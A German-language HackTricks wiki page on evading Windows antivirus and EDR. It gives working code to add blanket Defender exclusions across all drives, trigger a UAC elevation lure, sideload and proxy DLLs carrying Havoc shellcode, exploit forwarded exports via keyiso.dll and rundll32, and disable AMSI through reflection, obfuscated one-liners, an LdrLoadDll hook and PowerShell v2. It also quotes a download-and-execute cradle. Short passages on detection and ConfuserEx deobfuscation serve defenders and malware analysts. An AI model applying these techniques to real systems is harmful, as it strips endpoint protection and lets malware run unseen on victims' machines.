# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde verfasst von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender außer Funktion zu setzen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender außer Funktion zu setzen, indem es ein anderes AV vortäuscht.
- [Defender deaktivieren, wenn Sie Admin sind](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder, bevor man Defender manipuliert

Öffentliche Loader, die sich als Game Cheats tarnen, werden häufig als unsignierte Node.js/Nexe-Installer ausgeliefert, die zuerst **den Benutzer um Elevation bitten** und erst danach Defender neutralisieren. Der Ablauf ist einfach:

1. Administrativen Kontext mit `net session` prüfen. Der Befehl gelingt nur, wenn der Aufrufer Admin-Rechte hat; ein Fehlschlag zeigt an, dass der Loader als Standardbenutzer läuft.
2. Startet sich sofort mit dem `RunAs`-Verb neu, um die erwartete UAC-Zustimmungsabfrage auszulösen, während die ursprüngliche Kommandozeile erhalten bleibt.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Die Opfer glauben bereits, dass sie “cracked” Software installieren, daher wird die Eingabeaufforderung normalerweise akzeptiert, wodurch die Malware die Rechte erhält, die sie benötigt, um die Richtlinie von Defender zu ändern.

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Sobald erhöhte Rechte erreicht sind, maximieren GachiLoader-style chains Defender-Blindstellen, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zuerst den GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt dann **extrem weitreichende Ausnahmen**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jeder Wechseldatenträger nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Die Schleife durchsucht jedes eingehängte Dateisystem (D:\, E:\, USB-Sticks, etc.), sodass **jeder später irgendwo auf der Festplatte abgelegte payload ignoriert wird**.
- Die Ausschlussregel für die Endung `.sys` ist zukunftsorientiert — Angreifer behalten sich die Option vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, wodurch spätere Stufen überprüfen können, ob die Ausnahmen bestehen bleiben oder sie erweitern können, ohne UAC erneut auszulösen.

Weil kein Defender-Service gestoppt wird, melden einfache Health-Checks weiterhin „antivirus active“, obwohl die Echtzeitüberprüfung diese Pfade nie berührt.

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und bei fortgeschritteneren EDRs behavioural analysis.

### **Static detection**

Static detection erfolgt, indem bekannte bösartige Strings oder Bytefolgen in einer Binärdatei oder einem Script markiert werden, und indem Informationen aus der Datei selbst extrahiert werden (z. B. file description, company name, digitale Signaturen, Icon, checksum, etc.). Das bedeutet, dass die Verwendung bekannter Public-Tools dich leichter auffliegen lassen kann, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, um diese Art der Erkennung zu umgehen:

- **Encryption**

Wenn du die Binärdatei verschlüsselst, gibt es für AV keine Möglichkeit, dein Programm zu erkennen, aber du wirst einen Loader benötigen, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**

Manchmal reicht es, einige Strings in deiner Binärdatei oder deinem Script zu ändern, um an AV vorbeizukommen, aber je nach dem, was du verschleiern willst, kann das zeitaufwändig sein.

- **Custom tooling**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis findet statt, wenn der AV deine Binärdatei in einer Sandbox ausführt und nach bösartiger Aktivität sucht (z. B. Versuch, Browser-Passwörter zu entschlüsseln und auszulesen, einen minidump von LSASS anzufertigen, etc.). Dieser Bereich ist etwas komplizierter, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Je nach Implementierung kann das eine sehr gute Methode sein, die dynamic analysis von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Arbeitsfluss des Nutzers nicht zu unterbrechen, daher können lange Sleeps die Analyse stören. Das Problem ist, dass viele Sandboxen des AVs den Sleep einfach überspringen können, je nachdem, wie er implementiert ist.
- **Checking machine's resources** Üblicherweise haben Sandboxes sehr wenige Ressourcen (z. B. < 2GB RAM), sonst könnten sie den Rechner des Nutzers verlangsamen. Hier kannst du auch kreativ werden, z. B. die CPU-Temperatur oder sogar die Lüfterdrehzahl prüfen — nicht alles wird in der Sandbox implementiert sein.
- **Machine-specific checks** Wenn du einen Nutzer gezielt angreifen willst, dessen Workstation in die Domain "contoso.local" eingebunden ist, kannst du die Computer-Domain prüfen und bei Nichtübereinstimmung dein Programm beenden.

Es stellt sich heraus, dass der Computername der Microsoft Defender Sandbox HAL9TH ist, also kannst du vor der Detonation in deiner malware nach dem Computername prüfen; wenn der Name HAL9TH lautet, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ein paar weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits zuvor erwähnt, werden **public tools** früher oder später **entdeckt**, also solltest du dir folgende Frage stellen:

Zum Beispiel, wenn du LSASS dumpen willst, **musst du wirklich mimikatz benutzen**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz ist es vermutlich eines der, wenn nicht das am stärksten von AVs und EDRs markierte Tools; obwohl das Projekt an sich super ist, ist es ein Alptraum, damit AVs zu umgehen. Such dir also Alternativen für das, was du erreichen möchtest.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Wann immer möglich, solltest du **bei der Evasion DLLs priorisieren**; meiner Erfahrung nach werden DLL-Dateien normalerweise **viel seltener** erkannt und analysiert, daher ist das ein einfacher Trick, um in manchen Fällen die Erkennung zu vermeiden (vorausgesetzt, dein payload kann als DLL ausgeführt werden).

Wie in diesem Bild zu sehen ist, hat ein DLL Payload von Havoc eine Detection-Rate von 4/26 auf antiscan.me, während der EXE-Payload eine Detection-Rate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Im Folgenden zeigen wir einige Tricks, die du mit DLL-Dateien nutzen kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und die bösartigen payload(s) nebeneinander positioniert werden.

Du kannst Programme auf Anfälligkeit für DLL Sideloading mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script überprüfen:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking anfällig sind, im Verzeichnis "C:\Program Files\\" und die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable programs selbst erkundest**, diese Technik ist bei korrekter Anwendung ziemlich unauffällig, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht erwischt werden.

Allein durch das Platzieren einer bösartigen DLL mit dem Namen, den ein Programm zu laden erwartet, wird dein payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu lösen, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy- (und bösartige) DLL macht, an die Original-DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung deines payloads gehandhabt werden kann.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcode-Vorlage und die ursprünglich umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (mit [SGN](https://github.com/EgeBalci/sgn) kodiert) als auch die proxy DLL haben auf [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass du dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) zu DLL Sideloading ansiehst und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das, was wir ausführlicher besprochen haben, zu erfahren.

### Missbrauch von Forwarded Exports (ForwardSideLoading)

Windows PE modules können Funktionen exportieren, die tatsächlich "forwarders" sind: Anstatt auf Code zu verweisen, enthält der Export-Eintrag einen ASCII-String der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows-Loader:

- Lade `TargetDll`, falls es nicht bereits geladen ist
- Löse `TargetFunc` daraus auf

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die das Verzeichnis des Moduls einschließt, das die Forward-Auflösung durchführt.

Das ermöglicht eine indirekte sideloading-Primitive: Finde eine signierte DLL, die eine Funktion exportiert, die an einen nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL im gleichen Verzeichnis, die genau den Namen des weitergeleiteten Zielmoduls trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch deine DllMain ausgeführt wird.

Beispiel, beobachtet auf Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (zum Kopieren/Einfügen):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Den Forward mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signed) lädt die Side-by-Side-`keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhalten Sie erst nach Ausführung von `DllMain` einen "missing API"-Fehler

Hinweise zur Erkennung:
- Konzentrieren Sie sich auf weitergeleitete Exporte, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Sie können weitergeleitete Exporte mit Tools wie beispielsweise:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 forwarder-Inventar, um Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Erkennungs-/Abwehrideen:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm bei Prozess/Modul-Ketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` unter benutzerschreibbaren Pfaden
- Setze Code-Integritätsrichtlinien (WDAC/AppLocker) durch und verweigere write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode verdeckt zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen entdeckt werden. Verlasse dich niemals nur auf ein Tool; wenn möglich, versuche mehrere evasion techniques zu verketten.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "fileless malware" zu verhindern. Anfangs konnten AVs nur **files on disk** scannen. Wenn es also möglich war, Payloads **directly in-memory** auszuführen, konnte das AV nichts dagegen unternehmen, da es nicht genug Einsicht hatte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Es ermöglicht Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer Form offengelegt werden, die unverschlüsselt und nicht obfuskiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Warnung bei Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Achte darauf, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei angibt, aus der das Skript lief — in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Speicher (in-memory) von AMSI erkannt.

Außerdem wird ab **.NET 4.8** auch C#-Code durch AMSI geprüft. Dies betrifft sogar `Assembly.Load(byte[])` für in-memory Ausführung. Deshalb wird empfohlen, niedrigere .NET-Versionen (wie 4.7.2 oder älter) für in-memory Ausführung zu verwenden, wenn man AMSI umgehen möchte.

Es gibt einige Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Ändern der Skripte, die man zu laden versucht, eine gute Methode sein, um eine Erkennung zu umgehen.

AMSI kann jedoch Skripte deobfuskieren, selbst wenn mehrere Schichten vorhanden sind, sodass Obfuscation je nach Umsetzung eine schlechte Option sein kann. Das macht das Umgehen nicht sehr trivial. Manchmal reicht jedoch schon, ein paar Variablennamen zu ändern — es hängt davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den Prozess von powershell (ebenfalls cscript.exe, wscript.exe, etc.) implementiert ist, lässt es sich selbst als unprivilegierter Benutzer leicht manipulieren. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Wege gefunden, AMSI-Scans zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es brauchte nur eine Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen nötig, um diese Technik verwenden zu können.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich auffallen wird, sobald dieser Beitrag veröffentlicht wird. Wenn dein Plan ist, unentdeckt zu bleiben, solltest du keinen Code veröffentlichen.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll (zuständig für das Scannen der vom Benutzer gelieferten Eingabe) zu finden und sie mit Instruktionen zu überschreiben, die den Code E_INVALIDARG zurückgeben. Auf diese Weise liefert der eigentliche Scan 0, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies bitte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt auch viele andere Techniken, um AMSI mit powershell zu umgehen; schau dir [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User‑Mode‑Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und für diesen Prozess finden keine Scans statt.

Implementierungsübersicht (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit benutzerdefinierten Loadern (alles, was sonst AMSI laden würde).
- Kombiniere es mit dem Einspeisen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilen-Artefakte zu vermeiden.
- Wurde bei Loadern verwendet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Skripte, um AMSI zu umgehen.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Skripte zum Umgehen von AMSI, die Signaturen vermeiden, indem sie benutzerdefinierte Funktionen, Variablen und Zeichenfolgen randomisieren und zufällige Groß-/Kleinschreibung bei PowerShell-Schlüsselwörtern anwenden.

**Entferne die erkannte Signatur**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool arbeitet, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und diese dann mit NOP-Instruktionen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Verwende PowerShell Version 2**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ohne AMSI-Scan ausführen kannst. Du kannst das so tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ist eine Funktion, die es ermöglicht, alle auf einem System ausgeführten PowerShell-Befehle zu protokollieren. Das kann für Überprüfungs- und Fehlerbehebungszwecke nützlich sein, kann aber auch ein **Problem für Angreifer darstellen, die eine Erkennung umgehen wollen**.

Um PowerShell logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Sie können ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) dafür verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne dass AMSI sie scannt. Sie können dies tun: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine powershell ohne Schutzmechanismen zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile  
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Das Ziel dieses Projekts ist es, einen open-source fork der [LLVM](http://www.llvm.org/) Compilation-Suite bereitzustellen, der erhöhte Software-Sicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und tamper-proofing ermöglicht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die `C++11/14`-Sprache nutzt, um bereits zur Compile-Zeit obfuscated code zu generieren, ohne externe Tools zu verwenden und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht von obfuscated operations hinzu, die durch das C++ template metaprogramming-Framework erzeugt werden und das Leben der Person, die die Anwendung cracken möchte, etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der in der Lage ist, verschiedene PE files zu obfuskieren, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feinkörniges Code-Obfuskations-Framework für LLVM-supported languages unter Verwendung von ROP (return-oriented programming). ROPfuscator obfuskiert ein Programm auf der Assembly-Ebene, indem reguläre Instruktionen in ROP-Ketten verwandelt werden und damit unsere natürliche Auffassung von normalem Kontrollfluss vereitelt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

Möglicherweise haben Sie diesen Bildschirm gesehen, wenn Sie einige executables aus dem Internet herunterladen und ausführen.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen, wodurch der Endbenutzer gewarnt und daran gehindert wird, die Datei auszuführen (obwohl die Datei weiterhin ausgeführt werden kann, indem man auf More Info -> Run anyway klickt).

